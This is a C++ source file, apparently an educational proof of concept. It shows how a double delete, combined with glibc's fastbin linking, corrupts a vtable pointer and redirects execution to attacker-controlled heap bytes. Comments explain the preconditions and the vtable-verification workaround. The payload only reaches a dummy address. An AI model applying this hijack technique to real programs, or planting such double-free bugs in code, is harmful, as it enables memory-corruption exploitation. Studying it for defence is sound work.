/* glibc fastbin's double destructor example
 *
 * This example doesn't actually double free.
 * Instead it takes advantage of heap state and the
 * fastbin linking mechanisms to redirect execution
 * flow to a pointer of the attackers choosing 
 * when the destructor is called the same time.
 *
 * When vtable verification is absent, this will
 * attempt to call 0x4141414141414141 and segfault.
 *
 * When vtable verification is present, it will
 * do the same, however it will abort due to the 
 * failure to verify the vftable. A work around 
 * would be any condition where the attacker is able
 * to reconstruct the vftable of type_one inside of 
 * m_buf/etc.
 *
 * This condition occurs because:
 * - p->fd = *fb
 *   *fb = p->fd
 *
 * Thus if an attacker can control the state of the
 * fastbin, and the data within the chunk at the top
 * of the fastbin, then they can cause the p->fd linking
 * which corrupts the vtable pointer to point to a 
 * location of their choosing. 
 *
 * The caveat being that the subsequent calls through the
 * vtable are sufficiently deep enough into the table
 * to point past the end of the heaps metadata for the
 * chunk.
 *
 * !!!!
 * JEMALLOC DOES NOT SHARE THIS CONDITION
 * !!!!
 *
 * tcmalloc seems to exhibit alternative memory
 * corrupt which makes the outcome less stable
 * however the what and why of it was not investigated.
 */

#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

class type_one
{
	private:
		uint8_t	m_buf[32];

	protected:
		/*
		 * For the initial steps, the biggest
		 * constraint is that vptr+offset to destructor
		 * must be greater than the metadata in mallocs
		 * chunk structures. In practice, this doesn't 
		 * seem to be overly problematic, for instance
		 * in Qt everything is derived from QObject
		 * with at least a few additional derived 
		 * classes. Thus what seems unreasonable or at
		 * least bordering on it in this example really
		 * isnt.
		 */
		virtual void method_one(void) {}
		virtual void method_two(void) {}
		virtual void method_three(void) {}
		virtual void method_four(void) {}
		virtual void method_five(void) {}
		virtual void method_six(void) {}
		virtual void method_seven(void) {}
		virtual void method_eight(void) {}
		virtual void method_nine(void) {}
		virtual void method_ten(void) {}
		virtual void method_eleven(void) {}

	public:
		type_one(void) { std::memset(m_buf, 0x41, sizeof(m_buf)); return; }
		virtual ~type_one(void) { return; }
};

signed int
main(void)
{
	type_one* 					one(nullptr);
	type_one* 					pad_zero(nullptr);
	type_one*					pad_one(nullptr);

	/* 
	 * What we are specifically abusing here is that
	 * fastbin chunks are not doubly linked, and 
	 * they are linked into the fastbin freelist
	 * via a construct akin to:
	 * p->FD = *fb;
	 * *fb = p;
	 *
	 * This has the side effect that our vftable
	 * pointer is corrupted during free. However
	 * depending on context of the application, 
	 * this can be useful to us; although only
	 * in the presence of other failures like a
	 * leak that discloses address space layout
	 * and similar.
	 */

	pad_zero	= new type_one;
	pad_one		= new type_one;

	delete pad_zero;
	delete pad_one;

	/* 
	 * with a chunk whose data we can
	 * control preceeding the object
	 * we intend to double free,
	 * we can seize control of 
	 * the instruction pointer here
	 * providing that the data we control
	 * is is outside of mallocs metadata.
	 */
	one 		= new type_one;

	delete one; // <-- corrupts the vptr
	delete one; // <-- attempts to call vptr+offset 
				//     which points to m_buf[x]

	return EXIT_SUCCESS;
}
